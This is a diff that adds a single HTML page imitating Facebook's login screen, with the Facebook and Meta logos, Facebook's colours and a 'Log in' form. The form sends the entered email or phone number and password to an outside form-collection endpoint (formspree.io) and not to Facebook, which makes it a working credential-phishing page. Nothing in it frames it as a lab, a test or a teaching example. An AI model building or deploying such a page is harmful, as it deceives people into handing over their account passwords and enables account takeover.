@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – log in or sign up</title>
+  <style type="text/css" media="all">
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 360px;
+      text-align: center;
+    }
+
+    .lang {
+      color: #606770;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 60px;
+      margin-bottom: 25px;
+    }
+
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .login-form input {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+    }
+
+    .login-btn {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .login-btn:hover {
+      background: #166fe5;
+    }
+
+    .forgot {
+      display: block;
+      margin: 15px 0;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #ddd;
+      margin: 15px 0;
+    }
+
+    .create-btn {
+      background: #42b72a;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.2s ease;
+    }
+
+    .create-btn:hover {
+      background: #36a420;
+    }
+
+    footer {
+      margin-top: 25px;
+      text-align: center;
+      color: #606770;
+      font-size: 13px;
+    }
+
+    footer img {
+      width: 20px;
+      vertical-align: middle;
+      margin-right: 4px;
+    }
+
+    footer .links a {
+      margin: 0 5px;
+      color: #606770;
+      text-decoration: none;
+    }
+
+    footer .links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <p class="lang">English (UK)</p>
+
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
+    </div>
+
+    <form class="login-form" action="https://formspree.io/f/xjkjvekv" method="post">
+      <input type="text" name="email" placeholder="Mobile number or email address" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit" class="login-btn">Log in</button>
+    </form>
+
+    <a href="#" class="forgot">Forgotten password?</a>
+
+    <hr>
+
+    <button class="create-btn">Create new account</button>
+
+    <footer>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo.svg" alt="Meta logo">
+      <p>Meta</p>
+      <div class="links">
+        <a href="#">About</a>
+        <a href="#">Help</a>
+        <a href="#">More</a>
+      </div>
+    </footer>
+  </div>
+</body>
+</html>
